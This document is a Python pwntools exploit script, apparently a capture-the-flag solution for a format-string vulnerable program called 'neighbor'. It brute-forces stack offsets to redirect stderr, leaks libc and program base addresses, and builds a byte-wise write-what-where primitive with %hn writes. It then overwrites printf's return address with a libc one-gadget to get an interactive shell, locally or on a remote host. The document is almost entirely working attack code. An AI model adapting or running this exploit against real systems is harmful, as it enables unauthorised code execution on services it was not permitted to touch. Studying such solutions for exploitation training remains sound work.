from pwn import *
import sys
import random

context(arch='amd64', os='linux')
#context.log_level = 'debug'

# rdx is address of buffer
# r8 is address of _IO_stdfile_1_lock
# stack:1 is address of _IO_2_1_stderr_
# address of buffer - 0x20 is address of saved standard error

# %0x?8x%9$hhn next rbp points to stderr on stack
# %0x?600x%11$hn stderr -> stdout (in theory)

def kindof_write_what_where(r, what, where):
    for c in p64(what):
        r.sendline('%{}x%9$hn'.format(where))
        if ord(c) != 0:
            r.sendline('%{}x%11$hhn'.format(ord(c)))
        else:
            r.sendline('%11$hhn')
        where += 1

def regular_printf_exploit(r, s_off):
    if len(sys.argv) == 1:
        STDOUT_OFF = 0x3db720
        GADGET_OFF = 0x47c9a
        #GADGET_OFF = 0xf1651
    else:
        STDOUT_OFF = 0x3c2600
        GADGET_OFF = 0x4557a

    print 'Running regular exploit...'

    # number 8 is now _IO_2_1_stdout_
    r.sendline('%8$p')
    stdout_base = int(r.recvuntil('\n').strip(), 16)
    libc_base = stdout_base - STDOUT_OFF
    print 'libc_base:', hex(libc_base)

    r.sendline('%9$p')
    printf_return = int(r.recvuntil('\n').strip(), 16) - 56
    print 'printf_return:', hex(printf_return)

    r.sendline('%{}x%9$hn'.format(printf_return & 0xffff))
    r.recvuntil('\n')
    r.sendline('%11$s')
    s = r.recvuntil('\n').strip()
    program_base = u64(s.ljust(8, '\x00')) - 0x926
    print 'prog_base:', hex(program_base)
    address_of_return = program_base + 0x964

    kindof_write_what_where(r, libc_base + GADGET_OFF, (printf_return + 8) & 0xffff)
    kindof_write_what_where(r, 0, (printf_return + 0x40) & 0xffff)
    r.sendline('%{}x%9$hn'.format(printf_return & 0xffff))
    r.sendline('%{}x%11$hn'.format(address_of_return & 0xffff))
    r.interactive()

    sys.exit(0)

attempts = 0
success = 0

while success == 0:
    attempts += 1
    print 'Attempt:', attempts
    if len(sys.argv) == 1:
        r = process('./neighbor_wrap.sh')
        stdout_base = 0x720
        timeout=1.2
    else:
        r = remote(sys.argv[1], int(sys.argv[2]))
        stdout_base = 0x600
        timeout=2

    r.recvuntil('mayor.\n')

    half = 0x68

    try:
        ctr = 0
        for s_off in xrange(0xd8, half, -0x10):
            guess = stdout_base
            #guess = random.randint(0, 15) * 0x1000 + stdout_base
            print 'Trying:', hex(s_off), hex(guess)
            r.sendline('%{}x%9$hhn'.format(s_off))
            r.sendline('%{}x%11$hn'.format(guess))
            ctr += 2
        r.sendline('cat')
        s = r.recvuntil('cat\n', timeout=ctr*timeout)
    except:
        print 'Initial half broke!'
        continue

    print 'Initial half passed!'

    try:
        s.index('cat')
        print 'Success:', hex(s_off), hex(guess)
        success = 1
        break
    except:
        pass

    try:
        for s_off in xrange(half, 0x00, -0x10):
            guess = stdout_base
            #guess = random.randint(0, 15) * 0x1000 + stdout_base
            print 'Trying:', hex(s_off), hex(guess)
            r.sendline('%{}x%9$hhn'.format(s_off))
            r.sendline('%{}x%11$hn'.format(guess))
            try: 
                r.sendline('cat')
                s = r.recvuntil('cat\n', timeout=3*timeout)
                if s != 'cat\n':
                    print 'Timed out...'
                    continue
                # success!
                print s
                print 'Success:', hex(s_off), hex(guess)
                success = 1
                break
            except:
                break
    except:
        pass

regular_printf_exploit(r, s_off)
